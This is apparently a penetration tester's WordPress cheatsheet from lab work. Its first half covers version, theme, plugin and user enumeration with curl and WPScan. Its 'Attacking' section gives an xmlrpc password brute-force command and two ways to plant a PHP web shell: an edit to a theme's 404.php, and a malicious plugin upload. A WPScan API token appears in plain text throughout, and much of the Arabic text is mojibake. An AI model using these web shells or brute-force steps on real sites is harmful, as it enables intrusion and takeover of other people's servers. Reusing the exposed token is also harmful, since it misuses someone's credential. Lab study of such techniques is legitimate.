# ğŸ›¡ï¸ WordPress Enumeration & Discovery Cheatsheet

### 1. Manual Footprinting (Discovery)
Use these commands to quickly identify WordPress components from the page source without running heavy scanners.

**Check Version**
Finds the generator meta tag showing the WP version.
```bash
curl -s http://target.local | grep "WordPress"
```

**Find Theme**
Extracts the directory name of the active theme.
```bash
curl -s http://target.local/ | grep "themes"
```

**Find Plugins**
Lists paths to installed plugins in the source code.
```bash
curl -s http://target.local/ | grep "plugins"
```

**Read Plugin Info**
Often reveals the exact version and changelog.
```bash
curl -s http://target.local/wp-content/plugins/[name]/readme.txt
```

---

### 2. Automated Scanning (WPScan)
WPScan is the primary tool for enumerating vulnerabilities, plugins, and users.

**Full Enumeration**
Runs default enumeration (vp, vt, u).
```bash
wpscan --url http://target.local --enumerate --api-token 0pen9rOvL7Jfqngcuau9ZBcUffHp2VfWgyyrAabVV2M
```

**Authenticated Scan**
Links results to WPVulnDB for known exploits.
```bash
wpscan --url http://target.local --api-token 0pen9rOvL7Jfqngcuau9ZBcUffHp2VfWgyyrAabVV2M
```

**All Plugins**
Scans for all plugins, not just popular/vulnerable ones.
```bash
wpscan --url http://target.local --enumerate ap --api-token 0pen9rOvL7Jfqngcuau9ZBcUffHp2VfWgyyrAabVV2M
```

**User Enumeration**
Brute-forces IDs and looks for author names.
```bash
wpscan --url http://target.local --enumerate u --api-token 0pen9rOvL7Jfqngcuau9ZBcUffHp2VfWgyyrAabVV2M
```

**Aggressive Mode**
Deep-dives into files to find hidden versions.
```bash
wpscan --url http://target.local --detection-mode aggressive --api-token 0pen9rOvL7Jfqngcuau9ZBcUffHp2VfWgyyrAabVV2M
```

**Performance**
Sets threads to 20 for faster scanning.
```bash
wpscan --url http://target.local -t 20 --api-token 0pen9rOvL7Jfqngcuau9ZBcUffHp2VfWgyyrAabVV2M
```

---

### 3. Critical Files & Paths
Always manually inspect these locations for leaks or configuration errors.

* `/robots.txt`: Look for disallowed paths like /wp-admin/ or sensitive plugin folders.
* `/wp-login.php`: The login portal. Check if it leaks "Invalid Username" vs "Invalid Password".
* `/readme.html`: A default file that frequently discloses the WordPress version.
* `/wp-content/uploads/`: Check for Directory Listing to find sensitive uploaded files.
* `/xmlrpc.php`: If present, it can be abused for faster password brute-forcing or DDoS.

---

### 4. User Roles Overview
Knowing the role helps you determine the impact of a compromised account.

1. **Administrator**: Full access (Can install plugins/edit code â†’ RCE).
2. **Editor**: Can manage all posts (even others').
3. **Author**: Can publish/manage their own posts.
4. **Contributor**: Can write/manage their own posts but cannot publish them.
5. **Subscriber**: Standard users who can browse posts and edit their profiles.


## Attacking
## Login Bruteforce

```shell-session
sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
```
# Code Excution 
Once ou looged iin go to themes 
there is a theme  editor and choose Twenty Nineteen: 404 TemplateÂ (404.php)
and add this line 
```php
system($_GET[0]);
```

Click onÂ `Update File`Â at the bottom to save. We know that WordPress themes are located atÂ `/wp-content/themes/<theme name>`. 

```url
http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
```

if u faced and error 
```
Unable to communicate back with site to check for fatal errors, so the PHP change was reverted. You will need to upload your PHP file change by some other means, such as by using SFTP.
```

- Ø±ÙˆØ­ Ø¹Ù„Ù‰ **Plugins** -> **Add New**.
    
- Ø§Ø¨Ø­Ø« Ø¹Ù† Plugin Ø§Ø³Ù…Ù‡ **"WP File Manager"** (Ø£Ùˆ Ø£ÙŠ Ø­Ø§Ø¬Ø© Ø´Ø¨Ù‡Ù‡).
    
- Ø³Ø·Ø¨Ù‡ ÙˆÙØ¹Ù„Ù‡ (Install & Activate).
    
- Ù‡ÙŠØ¸Ù‡Ø±Ù„Ùƒ Ø£ÙŠÙ‚ÙˆÙ†Ø© Ø¬Ø¯ÙŠØ¯Ø© Ù„Ù„Ù€ File Manager ÙÙŠ Ø§Ù„Ù‚Ø§Ø¦Ù…Ø©ØŒ Ø§ÙØªØ­Ù‡Ø§.
    
- Ø±ÙˆØ­ Ù„Ù„Ù…Ø³Ø§Ø±: `wp-content/themes/twentynineteen/` (Ø£Ùˆ Ø§Ù„Ø«ÙŠÙ… Ø§Ù„Ù„ÙŠ Ø´ØºØ§Ù„).
    
- ÙƒÙ„ÙŠÙƒ ÙŠÙ…ÙŠÙ† Ø¹Ù„Ù‰ `404.php` ÙˆØ§Ø®ØªØ§Ø± **Code Editor**.
    
- Ø­Ø· Ø§Ù„ÙƒÙˆØ¯ Ø¨ØªØ§Ø¹Ùƒ `system($_GET[0]);` ÙˆØ³ÙŠÙ. **Ù‡ÙŠØ³ÙŠÙ Ù…Ø¹Ø§Ùƒ ÙÙˆØ±Ø§Ù‹ Ù…Ù† ØºÙŠØ± ÙˆØ¬Ø¹ Ø¯Ù…Ø§Øº.**

or 
### Ø§Ù„Ø­Ù„ Ø§Ù„Ø«Ø§Ù†ÙŠ: Ø±ÙØ¹ Plugin Ø®Ø¨ÙŠØ« (Malicious Plugin)

Ø¨Ø¯Ù„ Ù…Ø§ ØªØ¹Ø¯Ù„ ÙÙŠ Ø§Ù„Ø«ÙŠÙ…ØŒ Ø§Ø¹Ù…Ù„ Ø£Ù†Øª Plugin Ø®Ø§Øµ Ø¨ÙŠÙƒ ÙˆØ§Ø±ÙØ¹ Shell.

1. Ø¹Ù„Ù‰ Ø¬Ù‡Ø§Ø²ÙƒØŒ Ø§Ø¹Ù…Ù„ Ù…Ù„Ù Ø§Ø³Ù…Ù‡ `shell.php` ÙˆØ§ÙƒØªØ¨ ÙÙŠÙ‡:
    
    PHP
    
    ```
    <?php
    /*
    Plugin Name: My Shell
    */
    system($_GET['cmd']);
    ?>
    ```
    
2. Ø§Ø¶ØºØ· Ø§Ù„Ù…Ù„Ù Ø¯Ù‡ ÙÙŠ Ù…Ù„Ù ZIP (Ù…Ø«Ù„Ø§Ù‹ `shell.zip`).
    
3. ÙÙŠ Ù„ÙˆØ­Ø© ØªØ­ÙƒÙ… Ø§Ù„ÙˆÙˆØ±Ø¯Ø¨Ø±ÙŠØ³ØŒ Ø±ÙˆØ­ **Plugins** -> **Add New** -> **Upload Plugin**.
    
4. Ø§Ø±ÙØ¹ Ù…Ù„Ù Ø§Ù„Ù€ Zip ÙˆÙØ¹Ù„Ù‡.
    
5. Ø¯Ù„ÙˆÙ‚ØªÙŠ Ø§Ù„Ù€ Shell Ø´ØºØ§Ù„ØŒ ÙˆØªÙ‚Ø¯Ø± ØªØ±ÙˆØ­Ù„Ù‡ Ø¹Ù„Ù‰ Ø§Ù„Ù…Ø³Ø§Ø±: 
6. `http://target.com/wp-content/plugins/shell/shell.php?cmd=id`


Any other vuln will be in the plugins just search them to exploit
